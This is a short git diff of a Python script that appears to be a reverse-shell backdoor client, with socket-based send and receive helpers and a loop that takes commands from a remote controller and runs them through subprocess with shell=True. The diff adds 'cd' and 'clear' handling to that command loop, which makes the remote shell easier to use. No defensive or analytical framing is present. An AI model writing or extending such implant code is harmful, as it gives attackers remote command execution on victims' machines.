@@ -2,6 +2,7 @@ import socket
 import time
 import json
 import subprocess
+import os
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -31,6 +32,10 @@ def shell():
         command = reliable_recv()
         if command == 'quit':
             break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
         else:
             # execute command
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
